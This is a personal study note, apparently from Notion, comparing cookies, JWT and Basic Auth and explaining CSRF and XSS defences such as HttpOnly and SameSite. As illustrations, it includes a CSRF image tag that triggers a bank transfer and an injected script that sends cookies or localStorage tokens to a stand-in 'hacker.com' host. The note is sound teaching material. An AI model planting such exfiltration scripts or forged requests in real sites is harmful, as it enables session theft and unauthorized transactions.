# Cookie Vs JWT

Source: https://app.notion.com/p/283fc75cbbd980fdaf65d16a7f2746d8?pvs=204

## Cookie Vs JWT vs Basic Auth

- <b>Cookie</b>: Browser automatically sends it, stored by browser, can't be read by JavaScript (HttpOnly)
- <b>JWT</b>: You manually add it to each request, usually stored in localStorage, JavaScript CAN read it
- <b>Basic Auth</b>: Sends username:password encoded (Base64) - LEAST secure
- <b>Kong Headers</b>: Special headers only Kong gateway understands - for internal use

<p />

### <b>OAuth2 ≠ Always Google/Facebook</b>

- OAuth2 is just a <b>protocol</b> (like HTTP is a protocol)
- <b>Your app WAS being its own OAuth2 server</b> (issuing tokens to YOUR users)
- "Login with Google" is using <b>Google's OAuth2 server</b>

### <b>Cookie vs JWT: Which is Better?</b>

<b>Cookie wins for websites:</b>

- ✅ HttpOnly makes it immune to JavaScript theft (XSS attacks)
- ✅ Browser handles everything automatically
- ⚠️ Needs CSRF protection

<b>JWT wins for mobile apps:</b>

- ✅ Works everywhere (mobile, web, desktop)
- ✅ No CSRF issues
- ❌ Usually in localStorage = JavaScript CAN steal it

## CSRF:

<b>The Attack:</b>

1. You login to YourBank.com → Get cookie
2. You visit EvilWebsite.com
3. EvilWebsite.com has hidden code: <code><img src="https://yourbank.com/transfer?to=hacker&amount=1000"></code>
4. Your browser automatically sends YOUR cookie when loading that "image"
5. YourBank.com thinks: "This is a real request from the user!"
6. Money transferred! 💸

<b>Why it works:</b><br />Your browser <b>automatically</b> includes cookies for every request to a domain, even if the request was triggered by a different website.

### <b>Your Security Concern: "Can't someone steal the header?"</b>

<b>YES, but here's the key:</b>

```java
BOTH Cookie and Authorization are HTTP headers!

GET /dashboard
Cookie: currentToken=abc123           ← This is a HEADER
Authorization: Bearer eyJhbG...       ← This is a HEADER
```

<b>The difference is NOT in the header, it's in the storage:</b>

```javascript
// Cookie with HttpOnly:
document.cookie  // Returns: "" (empty - JavaScript CANNOT see it)
// ✅ Hacker's JavaScript: BLOCKED

// JWT in localStorage:
localStorage.getItem('token')  // Returns: "eyJhbG..." (JavaScript CAN see it)
// ❌ Hacker's JavaScript: SUCCESS, TOKEN STOLEN
```

HttpOnly doesn't protect the <b>transmission</b> (both travel as headers).<br />HttpOnly protects the <b>storage</b> (JavaScript can't read the cookie).

```javascript
// Hacker injects this script in your website:
<script>
  // Try to steal cookie
  fetch('hacker.com/steal?data=' + document.cookie);  // Gets NOTHING if HttpOnly
  
  // Try to steal JWT
  fetch('hacker.com/steal?data=' + localStorage.getItem('token'));  // Gets TOKEN! ❌
</script>
```

### <b>Protection layers:</b>

1. <b>HTTPS</b> → Protects transmission (both Cookie and JWT)
2. <b>HttpOnly</b> → Protects from JavaScript theft (Cookie only)
3. <b>SameSite</b> → Protects from CSRF (Cookie only)

<b>SameSite</b> tells the browser: <b>"Only send this cookie if the request is coming from the SAME website"</b>

1. <b>SameSite=Strict</b>: Cookie NEVER sent from other sites (even clicking links)
2. <b>SameSite=Lax</b> ⭐ (RECOMMENDED): Cookie sent only for safe things (clicking links), NOT for dangerous things (forms, images)
3. <b>SameSite=None</b>: Cookie always sent (no protection)

```javascript
Cookie cookie = new Cookie("currentToken", token);
cookie.setSameSite("Lax");  // ← This line stops CSRF attacks!
```
